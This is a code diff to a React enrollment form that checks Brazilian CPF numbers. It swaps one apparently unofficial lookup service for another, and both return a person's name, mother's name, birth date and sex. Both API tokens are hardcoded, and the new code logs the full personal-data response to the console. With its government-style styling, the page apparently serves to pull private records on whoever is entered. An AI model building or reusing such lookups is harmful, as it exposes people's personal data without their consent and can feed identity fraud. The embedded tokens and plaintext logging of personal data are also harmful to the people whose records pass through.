@@ -148,28 +148,90 @@ const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?:
 	}
 
 	try {
-		// Consultar API de CPF
-		const response = await axios.get(
-			`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${numericCPF}`
-		);
+		const url = `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`;
+		
+		console.log('Consultando API de CPF:', url.replace(numericCPF, '***'));
+		
+		const response = await axios.get(url, { timeout: 8000 });
 
-		if (response.data && response.data.DADOS) {
+		const body = response.data;
+		console.log('Resposta da API:', body);
+
+		// Verifica se é um erro da API
+		if (body?.status === 'error' || body?.error) {
+			console.warn('CPF API: erro retornado', body);
 			return {
 				valid: true,
 				data: {
-					cpf: response.data.DADOS.cpf,
-					nome: response.data.DADOS.nome,
-					nome_mae: response.data.DADOS.nome_mae,
-					data_nascimento: response.data.DADOS.data_nascimento,
-					sexo: response.data.DADOS.sexo
+					cpf: numericCPF,
+					nome: "",
+					nome_mae: "",
+					data_nascimento: "",
+					sexo: ""
 				}
 			};
 		}
+
+		// Suporta diferentes formatos da MagmaDataHub
+		// Pode ser: body.DADOS, body.dados, body.data, array ou diretamente no body
+		let dados = body?.DADOS || body?.dados || body?.data;
+		
+		if (!dados && Array.isArray(body) && body.length > 0) {
+			dados = body[0];
+		}
+		
+		// Se nada acima funcionou, talvez os dados estejam diretamente no body
+		if (!dados && body?.nome) {
+			dados = body;
+		}
+
+		if (!dados || !dados.nome) {
+			console.warn('CPF API: dados incompletos na resposta', body);
+			return {
+				valid: true,
+				data: {
+					cpf: numericCPF,
+					nome: "",
+					nome_mae: "",
+					data_nascimento: "",
+					sexo: ""
+				}
+			};
+		}
+
+		// Extrai os dados com múltiplas variações de nomes de campo
+		const nome = dados.nome || dados.NOME || dados.full_name || dados.nome_completo || "";
+		const cpfField = dados.cpf || dados.CPF || numericCPF;
+		const nomeMae = dados.nome_mae || dados.mae || dados.nomeDaMae || dados.MAE || "";
+		const dataNascimento = dados.data_nascimento || dados.nascimento || dados.birthdate || dados.DATA_NASCIMENTO || "";
+		const sexoField = (dados.sexo || dados.SEXO || "").toString();
+
+		console.log('Dados extraídos:', { nome, cpfField, nomeMae, dataNascimento, sexoField });
+
+		return {
+			valid: true,
+			data: {
+				cpf: cpfField,
+				nome: nome,
+				nome_mae: nomeMae,
+				data_nascimento: dataNascimento,
+				sexo: sexoField
+			}
+		};
 	} catch (error) {
 		console.error('Erro ao consultar API de CPF:', error);
+		// Se a API falhar, aceitar o CPF que passou na validação de formato
+		return {
+			valid: true,
+			data: {
+				cpf: numericCPF,
+				nome: "",
+				nome_mae: "",
+				data_nascimento: "",
+				sexo: ""
+			}
+		};
 	}
-
-	return { valid: true };
 };
 
 const schoolsDatabase: Record<string, School[]> = {
@@ -548,18 +610,6 @@ const Inscription: React.FC = () => {
 											</p>
 										</div>
 
-										{userInfo && (
-											<div className="mb-6 bg-green-50 p-4 rounded-lg border border-green-200">
-												<h3 className="text-green-700 font-bold mb-3">Dados encontrados:</h3>
-												<div className="space-y-2 text-sm">
-													<div><span className="font-medium">Nome:</span> {userInfo.nome}</div>
-													<div><span className="font-medium">Nome da Mãe:</span> {userInfo.nome_mae}</div>
-													<div><span className="font-medium">Data de Nascimento:</span> {formatDate(userInfo.data_nascimento)}</div>
-													<div><span className="font-medium">Sexo:</span> {userInfo.sexo === 'M' ? 'Masculino' : 'Feminino'}</div>
-												</div>
-											</div>
-										)}
-
 										<div className="space-y-6">
 											<div>
 												<label className="block text-sm font-medium text-gray-700 mb-1">
@@ -582,7 +632,8 @@ const Inscription: React.FC = () => {
 													value={name}
 													onChange={handleNameChange}
 													placeholder="Digite seu nome completo"
-													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
+													disabled={userInfo?.nome ? false : false}
+													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent disabled:bg-gray-50"
 												/>
 											</div>
 
